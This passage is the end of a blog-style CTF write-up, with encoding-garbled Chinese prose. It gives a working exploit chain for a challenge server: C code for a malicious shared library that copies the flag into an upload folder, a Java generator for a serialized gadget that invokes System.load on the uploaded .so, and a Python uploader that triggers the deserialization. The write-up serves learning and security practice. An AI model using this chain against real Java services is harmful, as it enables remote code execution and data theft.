&#125;</span><br><span class="line"></span><br><span class="line">    if (src_flag == NULL) return;</span><br><span class="line"></span><br><span class="line">    // 2. æ‰“å¼€ç›®æ ‡æ–‡ä»¶ (å†™å…¥åˆ°ä¸Šä¼ ç›®å½•ï¼Œé¿å¼€ flag å…³é”®å­—)</span><br><span class="line">    dst_file = fopen(&quot;/app/upload/hack.txt&quot;, &quot;w&quot;);</span><br><span class="line">    if (dst_file == NULL) &#123;</span><br><span class="line">        // å¦‚æœç»å¯¹è·¯å¾„ä¸å¯¹ï¼Œå°è¯•ç›¸å¯¹è·¯å¾„</span><br><span class="line">        dst_file = fopen(&quot;./upload/hack.txt&quot;, &quot;w&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (dst_file == NULL) &#123;</span><br><span class="line">        fclose(src_flag);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 3. é€å­—èŠ‚å¤åˆ¶å†…å®¹ (çº¯åº•å±‚æ“ä½œï¼Œä¸ä¾èµ– shell)</span><br><span class="line">    while ((ch = fgetc(src_flag)) != EOF) &#123;</span><br><span class="line">        fputc(ch, dst_file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(src_flag);</span><br><span class="line">    fclose(dst_file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘åï¼Œå°†å¾—åˆ°çš„æ¶æ„.soæ–‡ä»¶ä¸Šä¼ ã€‚ç´§æ¥ç€ï¼Œæˆ‘ä»¬éœ€è¦è§¦å‘javaååºåˆ—åŒ–ï¼Œç„¶åæœåŠ¡å™¨è¯»å–æˆ‘ä»¬çš„soæ–‡ä»¶ï¼Œå¹¶å°†flagæ¬å‡ºã€‚</p>
<p>ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">package com.example.utile;</span><br><span class="line"></span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class PayloadGen &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        YouFindThis gadget = new YouFindThis();</span><br><span class="line">        </span><br><span class="line">        // 1. ç›®æ ‡ç±»: System</span><br><span class="line">        gadget.aClass = java.lang.System.class;</span><br><span class="line">        </span><br><span class="line">        // 2. å‚æ•°ç±»å‹: String</span><br><span class="line">        gadget.argclass = String.class;</span><br><span class="line">        </span><br><span class="line">        // 3. ç›®æ ‡æ–¹æ³•: load </span><br><span class="line">        gadget.methed = &quot;load&quot;;</span><br><span class="line">        </span><br><span class="line">        // 4. input: é™æ€æ–¹æ³•å¿½ç•¥æ­¤å‚æ•°ï¼Œä½†éœ€éç©º</span><br><span class="line">        gadget.input = &quot;ignored&quot;; </span><br><span class="line">        </span><br><span class="line">        // 5. å‚æ•°: .so æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</span><br><span class="line">        gadget.args = &quot;/app/upload/hack_final.so&quot;; </span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(gadget);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªjavaä»£ç è¿è¡Œå‡ºä¸€å¤§ä¸²çš„base64ç¼–ç ï¼Œç„¶åæˆ‘ä»¬åˆ©ç”¨pyä»£ç ï¼Œç›´æ¥ä¸Šä¼ ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">TARGET_URL = &quot;http://challenge.bluesharkinfo.com:26971/api/upload&quot;</span><br><span class="line"></span><br><span class="line">PAYLOAD = &quot;Base64å­—ç¬¦ä¸²&quot; </span><br><span class="line"></span><br><span class="line">def exploit():</span><br><span class="line">    print(f&quot;[*] æ­£åœ¨å‘é€è§¦å‘åŒ… (System.load) åˆ°: &#123;TARGET_URL&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    # 1. key å¿…é¡»æ˜¯ &#x27;file&#x27;</span><br><span class="line">    # 2. filename å¿…é¡»ä»¥ .ref ç»“å°¾ (è¿™æ˜¯ api.java è§¦å‘ååºåˆ—åŒ–çš„æ¡ä»¶)</span><br><span class="line">    # 3. å†…å®¹ æ˜¯ Java ç”Ÿæˆçš„ Base64</span><br><span class="line">    files = &#123;</span><br><span class="line">        &#x27;file&#x27;: (&#x27;trigger.ref&#x27;, PAYLOAD, &#x27;application/octet-stream&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        # å‘é€è¯·æ±‚</span><br><span class="line">        # timeout è®¾ç½®ä¸º 10 ç§’ï¼Œå› ä¸º System.load å¯èƒ½ä¼šå¯¼è‡´çŸ­æš‚é˜»å¡</span><br><span class="line">        response = requests.post(TARGET_URL, files=files, timeout=10)</span><br><span class="line">        </span><br><span class="line">        print(f&quot;[*] å“åº”çŠ¶æ€ç : &#123;response.status_code&#125;&quot;)</span><br><span class="line">        print(f&quot;[*] å“åº”å†…å®¹: &#123;response.text&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        if &quot;å¤‡ä»½æˆåŠŸ&quot; in response.text:</span><br><span class="line">            print(&quot;\n[+] è§¦å‘æˆåŠŸï¼&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;\n[-] æœªçœ‹åˆ°&#x27;å¤‡ä»½æˆåŠŸ&#x27;æç¤ºï¼Œä½†æœ‰å¯èƒ½å·²ç»æ‰§è¡Œã€‚å»ºè®®ç›´æ¥å»å°è¯•è¯»å– Flagã€‚&quot;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;[-] è¯·æ±‚å‘é€å¼‚å¸¸ (å¯èƒ½æ˜¯å› ä¸ºæœåŠ¡è¢«åŠ è½½æŒ‚èµ·äº†ï¼Œå±æ­£å¸¸ç°è±¡): &#123;e&#125;&quot;)</span><br><span class="line">        print(&quot;[*] ä¾ç„¶å»ºè®®å»å°è¯•è¯»å– Flagã€‚&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    if PAYLOAD == &quot;è¿™é‡Œå¡«ä½ ç”Ÿæˆçš„Base64å­—ç¬¦ä¸²&quot;:</span><br><span class="line">        print(&quot;[-] é”™è¯¯ï¼šè¯·å…ˆå°† Java ç”Ÿæˆçš„ Base64 å¡«å…¥ PAYLOAD å˜é‡ï¼&quot;)</span><br><span class="line">    else:</span><br><span class="line">        exploit()</span><br></pre></td></tr></table></figure>

<p>æœ€åé€šè¿‡è§¦å‘æœåŠ¡å™¨javaååºåˆ—åŒ–ï¼Œæ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶ï¼Œå°†flagæ¬å‡ºæ”¾åœ¨hack.txtä¸Šï¼Œç›´æ¥è®¿é—®hack.txtã€‚å°±æ‹¿åˆ°äº†flagã€‚</p>
<hr>
<p>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ç”±ç™½ç™½æ¯›æ¯›åˆ›ä½œï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p>

        </div>
    </article>
</div>

</div>

<script src="/js/main.js?v=1767442695293"></script>
</body>
</html>
